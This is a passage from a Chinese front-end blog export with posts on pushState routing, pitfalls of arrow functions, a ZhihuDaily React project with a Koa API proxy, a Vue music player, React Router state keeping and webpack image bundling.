很显然，在我们单页应用中是需要你去大部分情况下都是需要去点击某个Link调用pushState，而这样是无法触发popstate事件的，需要重写一下pushState，并且给他也定义一个事件，这里就叫他onpushstate吧，比如下面这样。 12345678910111213(function(history)&#123; var pushState = history.pushState; history.pushState = function(state) &#123; if (typeof history.onpushstate == \"function\") &#123; history.onpushstate(&#123;state: state&#125;); &#125; return pushState.apply(history, arguments); &#125;&#125;)(window.history)window.onpopstate = history.onpushstate = function(event) &#123; // change view&#125; 如此一来，进行pushState操作会触发onpushstate事件，我们可以在onpushstate事件的回调中进行视图切换了，而前进后退我们可以通过popstate来操作。 别忘了给a标签做一些必要操作，阻止默认跳转，而是通过pushState改变url，然后由于pushState被调用，又会触发onpushstate事件，其内的逻辑代码就会被执行，比如，切换视图。 12345678var elements = document.getElementsByTagName('a');for(var i = 0, len = elements.length; i &lt; len; i++) &#123; elements[i].onclick = function (event) &#123; event.preventDefault(); var route = event.target.getAttribute('href'); history.pushState(&#123;page: route&#125;, route, route) &#125;&#125; 前端路由的基本实现就是以上了，代码来自余博伦-知乎首页，现在再回头看vue-router/react-router是否清晰了一点呢，当然其内部实现远远不是这么简单。 小知识-pjaxpjax是一种基于ajax+history.pushState的新技术，该技术可以无刷新改变页面的内容，并且可以改变页面的URL。pjax是ajax+pushState的封装，同时支持本地存储、动画等多种功能。目前支持jquery、qwrap、kissy等多种版本。 众所周知，Ajax可以实现页面的无刷新操作——优点；但是，也会造成另外的问题，无法前进与后退！曾几何时，Gmail似乎借助iframe搞定，如今，HTML5让事情变得如同过家家般简单。 当执行Ajax操作的时候，往浏览器history中塞入一个地址（使用pushState）（这是无刷新的）；于是，返回的时候，通过URL或其他传参，我们就可以还原到Ajax之前的模样。 ajax与HTML5 history pushState/replaceState实例-张鑫旭","tags":[{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"}]},{"title":"什么时候你不能使用箭头函数？","date":"2017-10-14T08:00:00.000Z","path":"2017/10/14/箭头函数/","text":"什么时候你不能使用箭头函数？译者：王仕军 共 2670 字，读完需 5 分钟。编译自 Dmitri Pavlutin 的文章，对原文内容做了精简和代码风格优化。ES6 中引入的箭头函数可以让我们写出更简洁的代码，但是部分场景下使用箭头函数会带来严重的问题，有哪些场景？会导致什么问题？该怎么解决，容我慢慢道来。 能见证每天在用的编程语言不断演化是一件让人非常兴奋的事情，从错误中学习、探索更好的语言实现、创造新的语言特性是推动编程语言版本迭代的动力。JS 近几年的变化就是最好的例子， 以 ES6 引入的箭头函数（arrow functions）、class 等特性为代表，把 JS 的易用性推到了新的高度。 关于 ES6 中的箭头函数，网上有很多文章解释其作用和语法，如果你刚开始接触 ES6，可以从这里开始。任何事物都具有两面性，语言的新特性常常被误解、滥用，比如箭头函数的使用就存在很多误区。接下来，笔者会通过实例介绍该避免使用箭头函数的场景，以及在这些场景下该如何使用函数表达式（function expressions）、函数声明或者方法简写（shorthand method）来保障代码正确性和可读性。 1. 定义对象方法JS 中对象方法的定义方式是在对象上定义一个指向函数的属性，当方法被调用的时候，方法内的 this 就会指向方法所属的对象。 1.1 定义字面量方法因为箭头函数的语法很简洁，可能不少同学会忍不住用它来定义字面量方法，比如下面的例子：123456789101112const calculator = &#123; array: [1, 2, 3], sum: () =&gt; &#123; console.log(this === window); // =&gt; true return this.array.reduce((result, item) =&gt; result + item); &#125;&#125;;console.log(this === window); // =&gt; true// Throws \"TypeError: Cannot read property 'reduce' of undefined\"calculator.sum(); calculator.sum 使用箭头函数来定义，但是调用的时候会抛出 TypeError，因为运行时 this.array 是未定义的，调用 calculator.sum 的时候，执行上下文里面的 this 仍然指向的是 window，原因是箭头函数把函数上下文绑定到了 window 上，this.array 等价于 window.array，显然后者是未定义的。 解决的办法是，使用函数表达式或者方法简写（ES6 中已经支持）来定义方法，这样能确保 this 是在运行时是由包含它的上下文决定的，修正后的代码如下： 12345678const calculator = &#123; array: [1, 2, 3], sum() &#123; console.log(this === calculator); // =&gt; true return this.array.reduce((result, item) =&gt; result + item); &#125;&#125;;calculator.sum(); // =&gt; 6 这样 calculator.sum 就变成了普通函数，执行时 this 就指向 calculator 对象，自然能得到正确的计算结果。 ——————————–赵志文的分割线开始—————————– 补充一个在sg看到的提问： 123456789var name=\"window\";var obj=&#123; name:'netease', print1:()=&gt;&#123; console.log(this.name); &#125;&#125;obj.print1();//window 题主描述：es6中的this是定义时绑定，跟运行时无关，我很纳闷就是这个例子中，定义时 print1方法里面的this不是应该最先查找到的就是obj里面的name吗，为什么输出是window，还是绑定到全局变量上去了?不是明明print1里面没有this，再查找外围this，先找到的应该是obj中的this吗？ 最佳回答： 箭头函数没有 this/super/arguments/new.target的绑定，这些值是由外围最近一层非箭头函数决定。 箭头函数的this和普通函数的this可以看成完全两个概念的东西，不用传统的this去理解。 我对外围的理解是，这个外围指的是()=&gt;{}整体的外围，比如你的代码中：name属性的外围是什么？print1的外围是什么？。所以 ()=&gt;{console.log(this.name);}的外围已经出了obj，从而进入window可以借助我下面的代码来理解：1234567891011121314var name = \"window\"; var obj = &#123; name: 'netease', print1: () =&gt; &#123; console.log(this.name); &#125;, print3: function () &#123; return ()=&gt;&#123; console.log(this.name); &#125; &#125; &#125; obj.print1();// window obj.print3()();// netease 注意是返回闭包函数 ——————————–赵志文的分割线结束—————————– 1.2 定义原型方法同样的规则适用于原型方法（prototype method）的定义，使用箭头函数会导致运行时的执行上下文错误，比如下面的例子： 1234567891011function Cat(name) &#123; this.name = name;&#125;Cat.prototype.sayCatName = () =&gt; &#123; console.log(this === window); // =&gt; true return this.name;&#125;;const cat = new Cat('Mew');cat.sayCatName(); // =&gt; undefined 使用传统的函数表达式就能解决问题： 1234567891011function Cat(name) &#123; this.name = name;&#125;Cat.prototype.sayCatName = function () &#123; console.log(this === cat); // =&gt; true return this.name;&#125;;const cat = new Cat('Mew');cat.sayCatName(); // =&gt; 'Mew' sayCatName 变成普通函数之后，被调用时的执行上下文就会指向新创建的 cat 实例。 ——————————–赵志文的分割线开始—————————– 来看看ES6中的class定义方法（传统写法、箭头函数写法） 1234567891011class Person &#123; Run() &#123; //传统形式的函数写法 this; &#125; eat = () =&gt; &#123; //es6中的箭头函数写法 this; &#125;&#125; 在ES5中 1234567891011121314var Person = (function () &#123; function Person() &#123; var _this = this; this.eat = function () &#123; //箭头写法直接挂到Person的this下 _this; &#125;; &#125; Person.prototype.Run = function () &#123; //传统写法则挂到prototype中定义 this; &#125;; return Person;&#125;()); 所以在ES6的class中定义的传统形式的函数写法是挂在到prototype上的，但是箭头函数并不是直接将挂载在原型上的函数写为箭头形式，而是在构造函数内定义。 直接在ES6的class中定义箭头函数方法，this是可以指向实例的(外层是构造函数，this指向实例)。 但是在ES5的原型上挂载箭头函数方法this就无法指向实例了（参考上文）。 ——————————–赵志文的分割线结束—————————– 2. 定义事件回调函数this 是 JS 中很强大的特性，可以通过多种方式改变函数执行上下文，JS 内部也有几种不同的默认上下文指向，但普适的规则是在谁上面调用函数 this 就指向谁，这样代码理解起来也很自然，读起来就像在说，某个对象上正在发生某件事情。 但是，箭头函数在声明的时候就绑定了执行上下文，要动态改变上下文是不可能的，在需要动态上下文的时候它的弊端就凸显出来。比如在客户端编程中常见的 DOM 事件回调函数（event listenner）绑定，触发回调函数时 this 指向当前发生事件的 DOM 节点，而动态上下文这个时候就非常有用，比如下面这段代码试图使用箭头函数来作事件回调函数： 12345const button = document.getElementById('myButton');button.addEventListener('click', () =&gt; &#123; console.log(this === window); // =&gt; true this.innerHTML = 'Clicked button';&#125;); 在全局上下文下定义的箭头函数执行时 this 会指向 window，当单击事件发生时，浏览器会尝试用 button 作为上下文来执行事件回调函数，但是箭头函数预定义的上下文是不能被修改的，这样 this.innerHTML 就等价于 window.innerHTML，而后者是没有任何意义的。 使用函数表达式就可以在运行时动态的改变 this，修正后的代码： 12345const button = document.getElementById('myButton');button.addEventListener('click', function() &#123; console.log(this === button); // =&gt; true this.innerHTML = 'Clicked button';&#125;); 当用户单击按钮时，事件回调函数中的 this 实际指向 button，这样的 this.innerHTML = ‘Clicked button’ 就能按照预期修改按钮中的文字。 3. 定义构造函数构造函数中的 this 指向新创建的对象，当执行 new Car() 的时候，构造函数 Car 的上下文就是新创建的对象，也就是说 this instanceof Car === true。显然，箭头函数是不能用来做构造函数， 实际上 JS 会禁止你这么做，如果你这么做了，它就会抛出异常。 换句话说，箭头构造函数的执行并没有任何意义，并且是有歧义的。比如，当我们运行下面的代码： 12345const Message = (text) =&gt; &#123; this.text = text;&#125;;// Throws \"TypeError: Message is not a constructor\"const helloMessage = new Message('Hello World!'); 构造新的 Message 实例时，JS 引擎抛了错误，因为 Message 不是构造函数。在笔者看来，相比旧的 JS 引擎在出错时悄悄失败的设计，ES6 在出错时给出具体错误消息是非常不错的实践。可以通过使用函数表达式或者函数声明 来声明构造函数修复上面的例子： 12345const Message = function(text) &#123; this.text = text;&#125;;const helloMessage = new Message('Hello World!');console.log(helloMessage.text); // =&gt; 'Hello World!' 4. 追求过短的代码箭头函数允许你省略参数两边的括号、函数体的花括号、甚至 return 关键词，这对编写更简短的代码非常有帮助。这让我想起大学计算机老师给学生留过的有趣作业：看谁能使用 C 语言编写出最短的函数来计算字符串的长度，这对学习和探索新语言特性是个不错的法子。但是，在实际的软件工程中，代码写完之后会被很多工程师阅读，真正的 write once, read many times，在代码可读性方面，最短的代码可能并不总是最好的。一定程度上，压缩了太多逻辑的简短代码，阅读起来就没有那么直观，比如下面的例子： 1234const multiply = (a, b) =&gt; b === undefined ? b =&gt; a * b : a * b;const double = multiply(2);double(3); // =&gt; 6multiply(2, 3); // =&gt; 6 multiply 函数会返回两个数字的乘积或者返回一个可以继续调用的固定了一个参数的函数。代码看起来很简短，但大多数人第一眼看上去可能无法立即搞清楚它干了什么，怎么让这段代码可读性更高呢？有很多办法，可以在箭头函数中加上括号、条件判断、返回语句，或者使用普通的函数： 123456789101112function multiply(a, b) &#123; if (b === undefined) &#123; return function (b) &#123; return a * b; &#125; &#125; return a * b;&#125;const double = multiply(2);double(3); // =&gt; 6multiply(2, 3); // =&gt; 6 为了让代码可读性更高，在简短和啰嗦之间把握好平衡是非常有必要的。 5. 总结箭头函数无疑是 ES6 带来的重大改进，在正确的场合使用箭头函数能让代码变的简洁、短小，但某些方面的优势在另外一些方面可能就变成了劣势，在需要动态上下文的场景中使用箭头函数你要格外的小心，这些场景包括：定义对象方法、定义原型方法、定义构造函数、定义事件回调函数。 One More Thing 本文作者王仕军，商业转载请联系作者获得授权，非商业转载请注明出处。如果你觉得本文对你有帮助，请点赞！如果对文中的内容有任何疑问，欢迎留言讨论。想知道我接下来会写些什么？欢迎订阅我的知乎专栏：《前端周刊：让你在前端领域跟上时代的脚步》。","tags":[{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"}]},{"title":"ZhihuDaily-React项目总结","date":"2017-10-09T11:35:52.000Z","path":"2017/10/09/ZhihuDaily-React项目总结/","text":"API：点这里，感谢 项目地址：Github 预览地址：初次加载有点慢… 依赖 框架：react 路由：react-router 4.0 HTTP请求：whatwg-fetch(主要是保证fetch兼容性) 设备判断：react-responsive UI：antd(主要是PC端) CSS预处理：stylus 移动端布局：flexible.js + rem 遇到的问题以及解决方法API问题1. API不支持跨域 那位大大的API是不支持跨域的，于是自己使用koa2+request-promise+koa-cors进行了后台API转发 ，代码如下，在源码的server/server.js中 123456789101112131415161718const Koa = require('koa');const cors = require('koa-cors');const rp = require('request-promise');const app = new Koa();const basrUrl = \"http://news-at.zhihu.com\";app.use(cors());const main = async (ctx, next) =&gt; &#123; const pathname = ctx.request.path; ctx.response.type = 'json'; ctx.response.body = JSON.parse(await rp(basrUrl + pathname));&#125;;app.use(main);app.listen(9999);console.log('app started at port 9999...'); 启动了服务后，对自己的本地服务器进行请求即可，只需要将原API的“http://news-at.zhihu.com”改为“http://localhost:9999”。 2.知乎图片防盗链问题“知乎的图片可能会通过请求头的referer参数判断，如果不是指定的域名会返回403，如果精通后台的同学，可以去访问这些图片来缓存这些图片，我是搜索到了一个相对简单一些的办法，点击链接，主要用到的是Images.weserv.nl这个网站，可以缓存图片，而且可以修改图片的尺寸大小。 具体是我自定义了一个过滤器，在需要用到地方，把知乎的url替换成这个图片代理网站的url，这样图片就可以显示了。” 123const replaceUrl = (srcUrl) =&gt; &#123; return srcUrl.replace(/http\\w&#123;0,1&#125;:\\/\\/p/g, 'https://images.weserv.nl/?url=p')&#125; 然后对返回的data直接进行如下操作: 1data = JSON.parse(replaceUrl(JSON.stringify(data))); data中的图片就可以正常引用了。 参考 使用vue完成知乎日报web版这个博主做的vue版十分完善，使用vue的同学可以看看。 React/React Router4.0相关问题1.React Router为何在url相同参数不同的情况下跳转但是并不刷新页面？案情描述：当我从“日常心理学”主题日报跳转至“用户推荐日报”时，组件内部数据没有刷新，仍然为“日常心理学”的数据，而非“用户推荐日报”数据。 路由一：/topic/abc 路由二：/topic/efg 即路由一跳转至路由二组件没有重新去获取数据，其实这个问题在vue-router里面也有，vue中是通过watch监测路由参数变化判断组件是否需要刷新。 解决方案：我们一般是在componentDidMount中获取数据，当我从路由一跳转至路由二，仍然为同一组件，所以并没有重新Mount。 也就是说，同级路由相同组件跳转的情况下，componentDidMount方法仅仅在第一次Mount的时候触发了，路由跳转并没有触发该方法。 但是路由跳转之后 props.params 变了, 我们可以在componentWillReceiveProps中进行第二次的数据拉取，于是会触发更新过程。 参考： React Router为何在url相同参数不同的情况下跳转但是并不刷新页面？ 2. 如何保持路由组件keep-alive，跳转返回后不重新渲染案情描述：假如我有以下两种需求： 有一个下拉加载更多列表页，当列表项达到1000项，点击列表项到详细页，当点击返回按钮时，保持列表页的一千条记录。 把下拉加载更改为翻页，假设不是通过改变URL，只是单纯的ajax请求，击列表项到详细页，当点击返回按钮时，返回离开时的那一页。 其实我之前也写过篇文章，戳这里 某一天我很无聊，正在刷知乎日报，我要完成一个目标：从2017-10-07号一直看到2017-01-01。 我一直看到了10-05的信息，此时列表已经较长了，点进去，看完了，返回，组件重新渲染，滚动条还原，数据还原，我又下拉到三天前，又看了一篇文章，返回，重复上述操作。 随着列表越来越长，我每一次返回的代价都是巨大的，我都要重新拉回到之前看到的地方，且数据还要重新加载，因为每次返回只能返回latest信息，无法返回你通过ajax下拉加载beforeNews的信息。 很显然，这个问题不解决，用户体验绝对负分。 解决方案： 方式一： 把加载页面的必要信息放URL里，后退就是浏览器的后退，回退时组件依然会重新渲染，componentDidMount的时候根据这些url的信息去请求API。数据保持离开时最新的状态。 这种方法在翻页情况下使用固然可以，但是像下拉加载那样，是多次请求的数据集合，就无法通过这种方式解决，而且后退时依旧进行了一次http请求。 方式二： 在componentWillUnMount方法中存储当前已经加载的数据到本地(sessionStorage,localStorage) 详情回退后,从本地取出数据，进行渲染(所以componentDidMount内部要判断本地是否已经存在数据，如果存在则return，不存在从服务器获取数据) 这种方式回退时不需要再次进行http请求，也能满足下拉的情况，我选择的就是这种方式。 参考： react-router-dom 怎么让第二个页面返回到第一个页面使得第一个页面不重新加载 React 和react-router ,实现回退的时候，如何使页面回退到以前的状态 3.后退时记录滚动条位置案情描述：同上 恢复数据还不够，只是省下了我加载的时间，而我还是要拉到最底部，所以滚动条的位置也需要恢复。 思路同上，将当前的scrollTop记录在一个全局变量中(我是作为LatestNews组件的属性，为了让需要滚动的组件获取到)，在componentWillUnMount方法中存储当前的滚动条位置(sessionStorage,localStorage)。 当后退返回时取出位置赋值给LatestNews.scrollPoint，确认数据更新后(一定要确认数据更新后，setState方法是异步方法)，在setState的回调中根据Latest.scrollPoint滚动需要滚动的组件。 参考 react判断滚动到底部以及保持原来的滚动位置 4. 当state的属性为数组，如何setState比较好这个主要是push,unshift方法的返回值造成state没有赋值成功，最好先用slice把数组copy以下，用copy的数组去push(data)，然后再去setState. 12345const _storiesQue = this.state.storiesQue.slice();_storiesQue.push(data);this.setState(&#123; storiesQue:_storiesQue&#125;); 这里有一篇文章写的很好 深入理解React 组件状态（State） 移动端适配问题1.react-responsive1npm install react-responsive --save 然后在index.js中 123456789101112131415import MediaQuery from 'react-responsive';ReactDOM.render( &lt;Router&gt; &lt;div&gt; &lt;MediaQuery query='(min-device-width:1224px)'&gt; &lt;PCIndex/&gt; &lt;/MediaQuery&gt; &lt;MediaQuery query='(max-device-width:1224px)'&gt; &lt;MBIndex/&gt; &lt;/MediaQuery&gt; &lt;/div&gt; &lt;/Router&gt;, document.getElementById('root')); 在设置了query参数后，就可以根据设备的宽度来决定渲染PC组件还是移动端组件，独立开发即可，当然，要考虑组件的复用。 2.flexible.js+rem布局关于flexible.js+rem布局有疑问的可以看下面的文章 参考： 移动端高清、多屏适配方案 使用Flexible实现手淘H5页面的终端适配 使用lib-flexible.js 首先: 1npm install lib-flexible --save 然后在index.js中，即可使用rem进行适配了。 1import 'lib-flexible'; 将px转为rem的几种方法 可以通过开发工具的插件，例如sublime上面就有插件 webpack的px2rem-loader，对stylus文件无效 使用定义好的预处理器(stylus,sass,less)的方法 以下是stylus的示例 123456789101112131415//定义一个变量和一个mixin$baseFontSize = 16; //默认基准font-sizepx2rem(name, px)&#123;&#123;name&#125;: px / $baseFontSize * 1rem;&#125;// 使用示例：.container &#123; px2rem('height', 240);&#125;// stylus翻译结果：.container &#123; height: 3.2rem;&#125; 参考： 三种预处理器px2rem 2. Drawer组件遮罩层滑动组织底部窗体滚动因为PC端用的是ant-design，对移动端不是很友好，所以移动端基本是自己手写(除了引入了antd的轮播图(Carousel)和折叠面板(Collapse)，不过真的丑)。 Drawer组件，如下图所示: 设计思路是：Drawer组件先通过绝对定位移出视窗外，当点击menu按钮时，添加class，改变left以及top的值,当然得有transition营造动画效果(还可以通过transform:translateZ(0)硬件加速)，同时渲染遮罩层mask，宽高均为100%. z-index层级：Drawer&gt;mask&gt;index 案件描述：当我不小心滑动到遮罩层mask的时候，底部list也在滑动，这显然不是我想要的，这里主要是看了张鑫旭大佬的文章。我就不细说了。 参考 web移动端浮层滚动阻止window窗体滚动JS/CSS处理 关于组件复用移动端以及PC端的news_detail/comments均是基于公共的模块news_content/comments_content/comment/avatar进行二次包装。 以内容详情页news_detail举例。 PC端内容详情页news_detail这一模块中包含评论comments模块，而移动端包含一个news_header头部模块。 所以采取对共有模块news_content进行引用，同时PC端引用comments模块进行组合，移动端引用news_header模块进行组合，在各自的news_detail里进行数据的获取，共有模块只负责展示，属于stateless组件。 这样一来，即使完全删除PC文件或者移动端文件，剩下的一方依然可以正常使用，二者之间不存在相互关联引用。 关于打包(未解决)记得要将开发时对webpack.config.dev.js做的操作也要对webpack.config.prod.js操作一遍。 比如我开发时引入了stylus，自己也配置了webpack.config.dev.js的环境[stylus, stylus-loader ]，在开发环境下没有问题。 但是打包之后stylus文件全部失效，一看好好的躺在static/media文件夹呢，说明生产环境的webpack没有配置好。再对webpack.config.prod.js里面的loaders也添加一遍就好了，其它同理。然后： 1npm run build 如何在github-page上展示呢？ 戳这里，虽然说的是vue项目，但是build后操作一模一样，除了将命令中dist=&gt;build 上传后会发现只有在github根路径才能正常访问，而不是仓库下面的路径，很坑啊。。。不是很懂这个原因啊，恳请高手替我解答一下，资源路径没问题，就是路由匹配不正确。 理想情况下应该是这个路径可以直接访问 1https://nickname.github.io/project/[index.html] 但是这个gh-pages的的路径进去是一个header（PC端），路由’/‘的组件没有渲染出来，点了以下header的首页’/topics’的链接，一切恢复正常，但是url却变成了下面这个：1https://nickname.github.io/topics 项目路径被吃了，这个路径直接访问又是404，难道react-router写path的时候只能相对于域名根路径？ 我看别人都是打包后资源加载问题，我发现直接打包资源路径没有问题，难道我开发时要把path由’/a’改为’/project/a’??? 如果有成功在gh-pages上展示项目的同学，请务必在评论中留下您的解决方案，真的非常感谢！ 参考 stackoverflow 如何在gh-pages上展示vue项目 后续操作：完善细节，自己写折叠面板。 后话如果我的文章给您了一点帮助，希望可以去github上给我一颗star。 能够在国庆短短几天从不知道react是啥到做个小东西出来，一直都是因为有这么多热爱分享的人，站在巨人的肩膀上！ 但是仍然有很多不足，请指正。 项目地址：狂戳这里⭐⭐⭐ 我的其他项目： Github: ⭐vue全家桶:高仿网易云音乐播放器 PC端 Github: ⭐vue + express + mongodb 打造个人博客 我的博客：点这里","tags":[{"name":"react","slug":"react","permalink":"http://yoursite.com/tags/react/"}]},{"title":"SoulBeats音乐播放器-Vue","date":"2017-10-09T11:33:52.000Z","path":"2017/10/09/vue练手项目-音乐播放器/","text":"这个项目是我最初学vue的时候做的，当时只是为了学习，结果后面逐渐超出了自己当时的能力范围，造成了以下几点问题： 模块划分不清，很乱，复用性很差（虽然和页面复用性部分少也有原因） 由于一开始没有想好布局架构，CSS很混乱，应该存在了一堆不必要的CSS代码。 代码命名不规范，该抽象的方法没有抽象。综上：这个项目真的很乱，虽然功能都实现了，但是代码一团糟，想着以后能后重写，但是我已经深深爱上的react，可能和我思维有所提升原因，最近做的ZhihuDaily-React就非常清晰了，所以，不要给这个项目star了，等我闲下来，好好重构一下。 谢谢！—————————————————-以上更新于10月 基于Vue的高仿网易云音乐 UI基本对着网易切…技术栈:vue全家桶+axios+stylus点击预览 请务必配合chrome桌面端进行食用全屏更佳[github]https://github.com/hackerwen/Netease-Music-of-Vue vue-router实现路由切换. vuex进行共享状态管理、处理组件间通信 axios发送http请求. stylus作css预处理. 初始化收藏歌单/歌曲通过html5提供的localstorage. api来源(爬虫+戳这里) 实现功能： 歌单（推荐歌单、收藏/删除歌单、歌单详情页） 收藏/删除歌曲 歌手详情页 搜索 （单曲、歌手、歌单） 在线播放（切歌、顺序、循环、单曲、列表） 排行榜 html5 audio控件重写 歌词同步 滑动至底部加载（歌单及搜索部分） 个性推荐轮播图（其实个性推荐那一页就一个轮播图） 预计添加功能： 添加歌曲播放页面评论分页 精细歌曲播放页动画 还未解决的问题 轮播图使用很传统的方式写的，不知道vue在处理轮播图这一块有没有什么独特的优势 如何更优雅的编写vue项目,很多地方都是想怎么写就怎么写，很多重复代码写了也懒得去抽象出来进行整理，很多问题都没有考虑，甚至很多地方自己都觉得很”脏”,真的很惭愧,希望有同学可以指点一二. 关于api特别谢谢我的室友. 轮播图、热门歌单、榜单是通过爬虫获取. 音乐直链是通过伪造客户端请求加解密网易云音乐官方api获取数据. 当然除了轮播图、热门歌单、榜单，其余api都可以从前面的AD’s api获取获取,十分感谢开发者,api文档也十分详细. 如有错误之处或者是做得不好可以改进的地方一定要指出来,谢谢谢谢,共同进步. 如果您觉得对您的学习有所帮助,欢迎给我一颗star前往github 前置项目：利用html+css+javascript写一个音乐播放器","tags":[{"name":"Vue","slug":"Vue","permalink":"http://yoursite.com/tags/Vue/"}]},{"title":"react router(1)-实现keep-alive","date":"2017-10-04T18:10:22.000Z","path":"2017/10/05/react router踩坑（一）——如何保持组件状态keep-alive/","text":"前言参考：https://www.v2ex.com/amp/t/386516http://react-china.org/t/react-react-router/3757/2 最近在学习react，其实有过mvvm框架学习经验之后，再上手另一门框架不会太困难。但是想要深入学习就会发现其中设计理念的不同，之前学的是vue，真的好方便，react初上手有些不习惯，习惯了jsx和es6写法之后，那可真是爽死了，比vue的模版简洁不少。 学习react router 4.0的时候将那些不适应放大到了极致，在RR4(react router 4.0)中，router是各种组件，对于习惯了之前vue的router.js配置文件的我来说，感觉画风一下子就变了。 这就是不同框架对于相同功能实现的不同理念吧，对于router组件化，这篇聊聊 React Router v4 的设计思想文章说的非常棒。 因为之前也用vue-router写过一些单页应用，上手RR4便马上寻找譬如路由嵌套、获取params、query等常用功能，看着文档也是能敲出来。 然而，如果真的那么轻松，我也不会在这浪费笔墨了。 写一个小demo的时候，想要实现类似于vue-router的keep-alive功能，突然发现，RR中没有，对的，就是没有。 keep-alive：包裹动态组件时，会缓存不活动的组件实例，而不是销毁它们。 假如我有以下两种需求： 有一个下拉加载更多列表页，当列表项达到1000项，点击列表项到详细页，当点击返回按钮时，保持列表页的一千条记录。 把下拉加载更改为翻页，假设不是通过改变URL，只是单纯的ajax请求，击列表项到详细页，当点击返回按钮时，返回离开时的那一页。 最近再做一个知乎日报的demo，界面如下： 这是最新消息版块： 倘若最新是10月4号的新闻，当我翻页到10月2号，点进其中一篇文章，后退返回，发现我又回到了10月4号那一页。 这是主题日报版块： 倘若我选择“开始游戏”主题日报，当我点进其中一篇文章，后退返回，发现又回到了最初的“日常心理学”主题日报，很难受。 在vue里面可以很轻松解决的问题，在react里当然也可以解决，只不过要需要换一种方式。 方式一：把加载页面的必要信息放URL里，后退就是浏览器的后退，回退时组件依然会重新渲染，componentDidMount的时候根据这些url的信息去请求API。数据保持离开时最新的状态。 这种方法在翻页情况下使用固然可以，但是像下拉加载那样，是多次请求的数据集合，就无法通过这种方式解决，而且后退时依旧进行了一次http请求。 方式二： 存储当前已经加载的数据到本地（sessionStorage,localStorage） 详情回退后,从本地取出数据，进行渲染（所以componentDid内部要判断本地是否已经存在数据，如果存在则return，不存在从服务器获取数据） 这种方式回退时不需要再次进行http请求，也能满足下拉的情况，我选择的就是这种方式。 如果还有更多的方法还望留言一同交流学习，谢谢回答过我这个问题的大佬！","tags":[{"name":"react","slug":"react","permalink":"http://yoursite.com/tags/react/"}]},{"title":"webpack踩坑（二）——图片打包及路径问题","date":"2017-10-02T14:53:14.000Z","path":"2017/10/02/webpack踩坑--图片打包及路径问题/","text":"本文非本人原创，转自webpack踩坑之路 (2)——图片的路径与打包，用于记录自己踩过的坑，谢谢作者大大，现在前端同质性文章太多了，提笔之前一搜，好文章一大把，就没有写的必要了，譬如这篇，太棒了。 正文在实际生产中有以下几种图片的引用方式： HTML文件中img标签的src属性引用或者内嵌样式引用 1![](photo.jpg)&lt;div style=\"background:url(photo.jpg)\"&gt;&lt;/div&gt; CSS文件中的背景图等设置 1.photo &#123; background: url(photo.jpg);&#125; JavaScript文件中动态添加或者改变的图片引用 1var imgTempl = '![](photo.jpg)';document.body.innerHTML = imgTempl; ReactJS中图片的引用 123456789101112import React from 'react';import ReactDOM from 'react-dom';class App extends React.Component &#123; render() &#123; return ( ![](photo.jpg) ); &#125;&#125;ReactDom.render(&lt;App/&gt;, document.querySelector('#container')); url-loader在 webpack 中引入图片需要依赖 url-loader 这个加载器。安装：1npm install url-loader --save-dev 当然你可以将其写入配置中，以后与其他工具模块一起安装。在 webpack.config.js 文件中配置如下：12345678module: &#123; loaders: [ &#123; test: /\\.(png|jpg)$/, loader: 'url-loader?limit=8192' &#125; ]&#125; test 属性代表可以匹配的图片类型，除了 png、jpg 之外也可以添加 gif 等，以竖线隔开即开。loader 后面 limit 字段代表图片打包限制，这个限制并不是说超过了就不能打包，而是指当图片大小小于限制时会自动转成 base64 码引用。上例中大于8192字节的图片正常打包，小于8192字节的图片以 base64 的方式引用。 url-loader 后面除了 limit 字段，还可以通过 name 字段来指定图片打包的目录与文件名： 12345678module: &#123; loaders: [ &#123; test: /\\.(png|jpg)$/, loader: 'url-loader?limit=8192&amp;name=images/[hash:8].[name].[ext]' &#125; ]&#125; 上例中的 name 字段指定了在打包根目录（output.path）下生成名为 images 的文件夹，并在原图片名前加上8位 hash 值。例：工程目录如下在 main.css 中引用了同级 images 文件夹下的 bg.jpg 图片1background-image: url(./images/bg.jpg); 通过之前的配置，使用 $ webpack 命令对代码进行打包后生成如下目录打包目录中，css 文件和 images 文件夹保持了同样的层级，可以不做任务修改即能访问到图片。区别是打包后的图片加了 hash 值，bundle.css 文件里引入的也是有hash值的图片。background-image: url(images/f593fbb9.bg.jpg); （上例中，使用了单独打包css的技术，只是为了方便演示） publicPathoutput.publicPath 表示资源的发布地址，当配置过该属性后，打包文件中所有通过相对路径引用的资源都会被配置的路径所替换。 12345output: &#123; path: 'dist', publicPath: '/assets/', filename: 'bundle.js'&#125; main.css1background-image: url(./images/bg.jpg); bundle.css1background-image: url(/assets/images/f593fbb9.bg.jpg); 该属性的好处在于当你配置了图片 CDN 的地址，本地开发时引用本地的图片资源，上线打包时就将资源全部指向 CDN 了。但是要注意，如果没有确定的发布地址不建议配置该属性，否则会让你打包后的资源路径很混乱。 JS中的图片初用 webpack 进行项目开发的同学会发现：在 js 或者 react 中引用的图片都没有打包进 bundle 文件夹中。正确写法应该是通过模块化的方式引用图片路径，这样引用的图片就可以成功打包进 bundle 文件夹里了js123var imgUrl = require('./images/bg.jpg'), imgTempl = '![]('+imgUrl+')';document.body.innerHTML = imgTempl; react1render() &#123; return (&lt;img src=&#123;require('./images/bg.jpg')&#125; /&gt;);&#125; HTML中的图片由于 webpack 对 html 的处理不太好，打包 HTML 文件中的图片资源是相对来说最麻烦的。这里需要引用一个插件—— html-withimg-loder1$ npm install html-withimg-loader --save-dev webpack.config.js 添加配置 12345678module: &#123; loaders: [ &#123; test: /\\.html$/, loader: 'html-withimg-loader' &#125; ]&#125; 在 bundle.js 中引用 html 文件1import '../index.html'; 这样 html 文件中的图片就可以被打包进 bundle 文件夹里了。 感谢您的浏览，希望能有所帮助","tags":[{"name":"webpack","slug":"webpack","permalink":"http://yoursite.com/tags/webpack/"}]},{"title":"webpack踩坑（一）——webpack-dev-server不更新","date":"2017-10-02T14:48:10.000Z","path":"2017/10/02/webpack踩坑--webpack-dev-server不刷新/","text":"前言第一次接触webpack是使用vue-cli的时候，方便极了，一行命令chua！chua！chua！好嘞，上手吧。 而对我这种新人来讲，需要手动搭建webpack开发环境的时候就是一脸懵逼了。 当你觉得一个工具很自然的时候，说明你还没有要到使用这个工具的地步。 只有经过了各种折磨之后，有人突然给你看一个大宝贝儿：“喏，这个很方便的”。你惊为天人的时候，这个工具才适合你。否则只是一个搬砖工，知其然不知其所以然。当然，搬砖搬得6那也是项绝活儿。 基本概念就不提了，什么entry入口文件、output输出路径、loader干啥的、plugin又是啥，看英文单词的中文意思即可。 